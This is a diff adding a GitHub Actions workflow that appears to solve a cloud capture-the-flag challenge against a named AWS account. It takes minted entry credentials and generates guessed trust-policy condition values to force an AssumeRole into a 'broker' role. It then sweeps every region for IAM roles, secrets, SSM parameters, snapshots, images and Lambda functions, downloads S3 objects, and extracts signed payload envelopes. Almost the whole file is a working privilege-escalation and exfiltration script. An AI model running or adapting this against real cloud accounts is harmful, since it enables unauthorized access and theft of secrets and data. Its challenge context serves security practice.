@@ -1,0 +1,468 @@
+name: MetricForge broker chain
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  mint:
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      entry_role: arn:aws:iam::125746528491:role/metricforge-entry-b8358a07fc
+      nonce: participant
+
+  broker:
+    needs: mint
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    permissions:
+      contents: read
+      actions: read
+
+    steps:
+      - name: Download entry session
+        uses: actions/download-artifact@v4
+        with:
+          name: metricforge-entry-session-participant
+          path: session
+
+      - name: Inspect and assume broker role
+        shell: bash
+        run: |
+          set -u
+          mkdir -p broker-result/entry broker-result/broker broker-result/downloads broker-result/analysis
+
+          SESSION_FILE="$(find session -maxdepth 2 -type f | head -n 1)"
+          test -n "${SESSION_FILE}" || { echo "Session artifact is empty"; exit 1; }
+
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId // .credentials.AccessKeyId // .AccessKeyId // empty' "${SESSION_FILE}")"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey // .credentials.SecretAccessKey // .SecretAccessKey // empty' "${SESSION_FILE}")"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken // .credentials.SessionToken // .SessionToken // empty' "${SESSION_FILE}")"
+          export AWS_DEFAULT_REGION=us-east-1
+          export AWS_PAGER=""
+
+          test -n "${AWS_ACCESS_KEY_ID}" || { echo "Could not parse entry credentials"; exit 1; }
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+          BROKER_NAME="metricforge-broker-9d7a0ac7cc"
+          BROKER_ARN="arn:aws:iam::125746528491:role/${BROKER_NAME}"
+
+          aws sts get-caller-identity --output json \
+            > broker-result/entry/identity.json \
+            2> broker-result/entry/identity.stderr || true
+
+          aws iam get-role --role-name "${BROKER_NAME}" --output json \
+            > broker-result/entry/broker-role.json \
+            2> broker-result/entry/broker-role.stderr || true
+
+          aws iam list-role-policies --role-name "${BROKER_NAME}" --output json \
+            > broker-result/entry/broker-inline-list.json \
+            2> broker-result/entry/broker-inline-list.stderr || true
+
+          (jq -r '.PolicyNames[]?' broker-result/entry/broker-inline-list.json 2>/dev/null || true) |
+          while IFS= read -r policy; do
+            safe="$(printf '%s' "${policy}" | tr -c 'A-Za-z0-9_.-' '_')"
+            aws iam get-role-policy \
+              --role-name "${BROKER_NAME}" \
+              --policy-name "${policy}" \
+              --output json \
+              > "broker-result/entry/broker-policy-${safe}.json" \
+              2> "broker-result/entry/broker-policy-${safe}.stderr" || true
+          done
+
+          # Build AssumeRole candidates from exact values exposed in the broker trust policy.
+          python3 - <<'PY'
+          import itertools
+          import json
+          import re
+          from pathlib import Path
+
+          role_file = Path("broker-result/entry/broker-role.json")
+          doc = json.loads(role_file.read_text())
+          statements = doc.get("Role", {}).get("AssumeRolePolicyDocument", {}).get("Statement", [])
+
+          values = {
+              "external_id": [None],
+              "source_identity": [None],
+              "role_session_name": ["metricforge-broker"],
+          }
+          tag_values = {}
+
+          def add(bucket, value):
+              if isinstance(value, list):
+                  for item in value:
+                      add(bucket, item)
+                  return
+              if not isinstance(value, str):
+                  return
+              # Convert simple wildcard patterns into a concrete candidate.
+              candidate = value
+              candidate = candidate.replace("*", "participant").replace("?", "x")
+              if candidate not in bucket:
+                  bucket.append(candidate)
+
+          for st in statements:
+              for operator, conditions in (st.get("Condition") or {}).items():
+                  if not isinstance(conditions, dict):
+                      continue
+                  for key, value in conditions.items():
+                      low = key.lower()
+                      if low == "sts:externalid":
+                          add(values["external_id"], value)
+                      elif low == "sts:sourceidentity":
+                          add(values["source_identity"], value)
+                      elif low == "sts:rolesessionname":
+                          add(values["role_session_name"], value)
+                      elif low.startswith("aws:requesttag/"):
+                          tag_key = key.split("/", 1)[1]
+                          bucket = tag_values.setdefault(tag_key, [])
+                          add(bucket, value)
+
+          tag_sets = [{}]
+          if tag_values:
+              keys = list(tag_values)
+              tag_sets = [
+                  dict(zip(keys, vals))
+                  for vals in itertools.product(*(tag_values[k] for k in keys))
+              ]
+
+          candidates = []
+          for ext, src, sess, tags in itertools.product(
+              values["external_id"],
+              values["source_identity"],
+              values["role_session_name"],
+              tag_sets,
+          ):
+              candidates.append({
+                  "external_id": ext,
+                  "source_identity": src,
+                  "role_session_name": sess,
+                  "tags": tags,
+              })
+
+          # Include common minimal fallbacks in case the policy only uses Null/ForAllValues conditions.
+          candidates.extend([
+              {
+                  "external_id": None,
+                  "source_identity": "participant",
+                  "role_session_name": "metricforge-broker",
+                  "tags": {},
+              },
+              {
+                  "external_id": None,
+                  "source_identity": "metricforge",
+                  "role_session_name": "metricforge-broker",
+                  "tags": {"Project": "metricforge-cloud-ctf"},
+              },
+          ])
+
+          unique = []
+          seen = set()
+          for c in candidates:
+              key = json.dumps(c, sort_keys=True)
+              if key not in seen:
+                  seen.add(key)
+                  unique.append(c)
+
+          Path("broker-result/analysis/assume-candidates.json").write_text(
+              json.dumps(unique, indent=2)
+          )
+          PY
+
+          # Try the generated candidates without printing credentials.
+          python3 - <<'PY'
+          import json
+          import os
+          import subprocess
+          from pathlib import Path
+
+          role_arn = "arn:aws:iam::125746528491:role/metricforge-broker-9d7a0ac7cc"
+          candidates = json.loads(
+              Path("broker-result/analysis/assume-candidates.json").read_text()
+          )
+
+          attempts = []
+          success = None
+          for index, candidate in enumerate(candidates):
+              cmd = [
+                  "aws", "sts", "assume-role",
+                  "--role-arn", role_arn,
+                  "--role-session-name", candidate["role_session_name"],
+                  "--duration-seconds", "3600",
+                  "--output", "json",
+              ]
+              if candidate.get("external_id"):
+                  cmd += ["--external-id", candidate["external_id"]]
+              if candidate.get("source_identity"):
+                  cmd += ["--source-identity", candidate["source_identity"]]
+              for key, value in candidate.get("tags", {}).items():
+                  cmd += ["--tags", f"Key={key},Value={value}"]
+
+              proc = subprocess.run(cmd, text=True, capture_output=True)
+              attempts.append({
+                  "index": index,
+                  "candidate": candidate,
+                  "returncode": proc.returncode,
+                  "stderr": proc.stderr,
+              })
+              if proc.returncode == 0:
+                  success = json.loads(proc.stdout)
+                  Path("broker-session.json").write_text(proc.stdout)
+                  break
+
+          Path("broker-result/analysis/assume-attempts.json").write_text(
+              json.dumps(attempts, indent=2)
+          )
+          if success is None:
+              raise SystemExit("No broker AssumeRole candidate succeeded")
+          PY
+
+          export AWS_ACCESS_KEY_ID="$(jq -r '.Credentials.AccessKeyId' broker-session.json)"
+          export AWS_SECRET_ACCESS_KEY="$(jq -r '.Credentials.SecretAccessKey' broker-session.json)"
+          export AWS_SESSION_TOKEN="$(jq -r '.Credentials.SessionToken' broker-session.json)"
+          echo "::add-mask::${AWS_ACCESS_KEY_ID}"
+          echo "::add-mask::${AWS_SECRET_ACCESS_KEY}"
+          echo "::add-mask::${AWS_SESSION_TOKEN}"
+
+          run_cmd() {
+            local output="$1"
+            shift
+            mkdir -p "$(dirname "${output}")"
+            {
+              printf 'COMMAND:'
+              printf ' %q' "$@"
+              printf '\n'
+            } > "${output}.command"
+            if "$@" > "${output}.stdout" 2> "${output}.stderr"; then
+              rm -f "${output}.exit"
+            else
+              printf '%s\n' "$?" > "${output}.exit"
+            fi
+          }
+
+          run_cmd broker-result/broker/identity aws sts get-caller-identity --output json
+          run_cmd broker-result/broker/iam-list-roles aws iam list-roles --max-items 1000 --output json
+          run_cmd broker-result/broker/iam-list-profiles aws iam list-instance-profiles --max-items 1000 --output json
+          run_cmd broker-result/broker/s3-list-buckets aws s3api list-buckets --output json
+          run_cmd broker-result/broker/route53-zones aws route53 list-hosted-zones --output json
+
+          REGIONS="$(aws ec2 describe-regions --all-regions \
+            --query 'Regions[?OptInStatus!=`not-opted-in`].RegionName' \
+            --output text 2>/dev/null || true)"
+          if [ -z "${REGIONS}" ]; then
+            REGIONS="us-east-1 us-east-2 us-west-1 us-west-2 ap-northeast-1 ap-northeast-2 ap-northeast-3 ap-south-1 ap-southeast-1 ap-southeast-2 ca-central-1 eu-central-1 eu-west-1 eu-west-2 eu-west-3 eu-north-1 sa-east-1"
+          fi
+          printf '%s\n' ${REGIONS} > broker-result/analysis/regions.txt
+
+          for region in ${REGIONS}; do
+            dir="broker-result/broker/${region}"
+            run_cmd "${dir}/ec2-images-owner" aws ec2 describe-images \
+              --region "${region}" --owners 125746528491 --include-deprecated --output json
+            run_cmd "${dir}/ec2-images-public-metricforge" aws ec2 describe-images \
+              --region "${region}" --executable-users all \
+              --filters "Name=name,Values=*metricforge*,*recovery*,*restore*" \
+              --output json
+            run_cmd "${dir}/ec2-snapshots-owner" aws ec2 describe-snapshots \
+              --region "${region}" --owner-ids 125746528491 --max-results 1000 --output json
+            run_cmd "${dir}/ssm-parameters" aws ssm describe-parameters \
+              --region "${region}" --max-results 50 --output json
+            run_cmd "${dir}/secrets" aws secretsmanager list-secrets \
+              --region "${region}" --max-results 100 --include-planned-deletion --output json
+            run_cmd "${dir}/lambda-functions" aws lambda list-functions \
+              --region "${region}" --max-items 1000 --output json
+            run_cmd "${dir}/dynamodb-tables" aws dynamodb list-tables \
+              --region "${region}" --output json
+            run_cmd "${dir}/kms-aliases" aws kms list-aliases \
+              --region "${region}" --limit 100 --output json
+            run_cmd "${dir}/signer-profiles" aws signer list-signing-profiles \
+              --region "${region}" --max-results 100 --output json
+            run_cmd "${dir}/backup-vaults" aws backup list-backup-vaults \
+              --region "${region}" --max-results 100 --output json
+          done
+
+          # Read exact S3 buckets/objects when visible to this role.
+          (jq -r '.Buckets[]?.Name' broker-result/broker/s3-list-buckets.stdout 2>/dev/null || true) |
+          while IFS= read -r bucket; do
+            safe_bucket="$(printf '%s' "${bucket}" | tr -c 'A-Za-z0-9_.-' '_')"
+            run_cmd "broker-result/broker/s3-${safe_bucket}-objects" \
+              aws s3api list-objects-v2 --bucket "${bucket}" --max-keys 500 --output json
+
+            listing="broker-result/broker/s3-${safe_bucket}-objects.stdout"
+            (jq -r '.Contents[]? | select(.Size <= 5242880) | .Key' "${listing}" 2>/dev/null || true) |
+            while IFS= read -r key; do
+              key_hash="$(printf '%s' "${key}" | sha256sum | cut -c1-16)"
+              mkdir -p "broker-result/downloads/s3-${safe_bucket}"
+              printf '%s\n' "${key}" > "broker-result/downloads/s3-${safe_bucket}/${key_hash}.key"
+              aws s3api get-object \
+                --bucket "${bucket}" \
+                --key "${key}" \
+                "broker-result/downloads/s3-${safe_bucket}/${key_hash}.bin" \
+                > "broker-result/downloads/s3-${safe_bucket}/${key_hash}.meta.json" \
+                2> "broker-result/downloads/s3-${safe_bucket}/${key_hash}.stderr" || true
+            done
+          done
+
+          # Try resources explicitly named by the broker's visible policy documents.
+          python3 - <<'PY'
+          import json
+          import re
+          from pathlib import Path
+
+          root = Path("broker-result/entry")
+          resources = set()
+          actions = set()
+          for path in root.glob("broker-policy-*.json"):
+              try:
+                  doc = json.loads(path.read_text())
+              except Exception:
+                  continue
+              for st in doc.get("PolicyDocument", {}).get("Statement", []):
+                  a = st.get("Action", [])
+                  r = st.get("Resource", [])
+                  if isinstance(a, str): a = [a]
+                  if isinstance(r, str): r = [r]
+                  actions.update(str(x) for x in a)
+                  resources.update(str(x) for x in r)
+
+          Path("broker-result/analysis/policy-actions.txt").write_text(
+              "\n".join(sorted(actions)) + "\n"
+          )
+          Path("broker-result/analysis/policy-resources.txt").write_text(
+              "\n".join(sorted(resources)) + "\n"
+          )
+          PY
+
+          # Fetch exact S3 resources named in policies even if ListAllMyBuckets is denied.
+          grep '^arn:aws:s3:::' broker-result/analysis/policy-resources.txt 2>/dev/null |
+          sed 's#^arn:aws:s3:::##' |
+          cut -d/ -f1 |
+          sort -u |
+          while IFS= read -r bucket; do
+            [ -n "${bucket}" ] || continue
+            safe_bucket="$(printf '%s' "${bucket}" | tr -c 'A-Za-z0-9_.-' '_')"
+            run_cmd "broker-result/broker/policy-s3-${safe_bucket}-objects" \
+              aws s3api list-objects-v2 --bucket "${bucket}" --max-keys 500 --output json
+            listing="broker-result/broker/policy-s3-${safe_bucket}-objects.stdout"
+            (jq -r '.Contents[]? | select(.Size <= 5242880) | .Key' "${listing}" 2>/dev/null || true) |
+            while IFS= read -r key; do
+              key_hash="$(printf '%s' "${key}" | sha256sum | cut -c1-16)"
+              mkdir -p "broker-result/downloads/policy-s3-${safe_bucket}"
+              printf '%s\n' "${key}" > "broker-result/downloads/policy-s3-${safe_bucket}/${key_hash}.key"
+              aws s3api get-object \
+                --bucket "${bucket}" \
+                --key "${key}" \
+                "broker-result/downloads/policy-s3-${safe_bucket}/${key_hash}.bin" \
+                > "broker-result/downloads/policy-s3-${safe_bucket}/${key_hash}.meta.json" \
+                2> "broker-result/downloads/policy-s3-${safe_bucket}/${key_hash}.stderr" || true
+            done
+          done
+
+          # Extract indicators and DSSE envelope candidates.
+          python3 - <<'PY'
+          import base64
+          import hashlib
+          import json
+          import re
+          from pathlib import Path
+
+          root = Path("broker-result")
+          analysis = root / "analysis"
+          blobs = []
+          for path in root.rglob("*"):
+              if not path.is_file() or path.stat().st_size > 10_000_000:
+                  continue
+              if path.name in {"broker-session.json"}:
+                  continue
+              try:
+                  blobs.append((path, path.read_bytes()))
+              except OSError:
+                  pass
+
+          combined = b"\n".join(data for _, data in blobs)
+          patterns = {
+              "ami-ids": rb"\bami-[0-9a-f]{17}\b",
+              "role-arns": rb"\barn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_/-]+\b",
+              "bucket-arns": rb"\barn:aws:s3:::[A-Za-z0-9._/*${}-]+\b",
+              "interesting-lines": rb"(?im)^.*(?:metricforge|recovery|restore|manifest|dsse|payload|seed|external.?id|source.?identity|requesttag).*$",
+          }
+          for name, pattern in patterns.items():
+              vals = sorted({m.decode("utf-8", "replace") for m in re.findall(pattern, combined)})
+              (analysis / f"{name}.txt").write_text("\n".join(vals) + ("\n" if vals else ""))
+
+          candidates = []
+
+          def visit(obj, source, trail="$"):
+              if isinstance(obj, dict):
+                  if {"payloadType", "payload", "signatures"} <= set(obj):
+                      item = {"source": str(source), "json_path": trail, "envelope": obj}
+                      try:
+                          payload = base64.b64decode(obj["payload"], validate=True)
+                          digest = hashlib.sha256(payload).hexdigest()
+                          item.update({
+                              "payload_sha256": digest,
+                              "C": digest[:16],
+                              "payload_utf8": payload.decode("utf-8", "replace"),
+                          })
+                      except Exception as exc:
+                          item["error"] = repr(exc)
+                      candidates.append(item)
+                  for key, value in obj.items():
+                      visit(value, source, f"{trail}.{key}")
+              elif isinstance(obj, list):
+                  for i, value in enumerate(obj):
+                      visit(value, source, f"{trail}[{i}]")
+
+          for path, data in blobs:
+              try:
+                  visit(json.loads(data), path)
+              except Exception:
+                  pass
+
+          (analysis / "dsse-candidates.json").write_text(
+              json.dumps(candidates, ensure_ascii=False, indent=2)
+          )
+          PY
+
+          {
+            echo "=== ENTRY IDENTITY ==="
+            cat broker-result/entry/identity.json 2>/dev/null || true
+            echo
+            echo "=== BROKER ROLE ==="
+            cat broker-result/entry/broker-role.json 2>/dev/null || true
+            echo
+            echo "=== BROKER POLICIES ==="
+            cat broker-result/entry/broker-policy-*.json 2>/dev/null || true
+            echo
+            echo "=== BROKER IDENTITY ==="
+            cat broker-result/broker/identity.stdout 2>/dev/null || true
+            echo
+            echo "=== POLICY ACTIONS ==="
+            cat broker-result/analysis/policy-actions.txt 2>/dev/null || true
+            echo
+            echo "=== POLICY RESOURCES ==="
+            cat broker-result/analysis/policy-resources.txt 2>/dev/null || true
+            echo
+            echo "=== INTERESTING LINES ==="
+            cat broker-result/analysis/interesting-lines.txt 2>/dev/null || true
+            echo
+            echo "=== DSSE CANDIDATES ==="
+            cat broker-result/analysis/dsse-candidates.json 2>/dev/null || true
+          } > broker-result/analysis/SUMMARY.txt
+
+          rm -rf session broker-session.json
+
+      - name: Upload broker results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: metricforge-broker-result
+          path: broker-result
+          if-no-files-found: warn
+          retention-days: 1
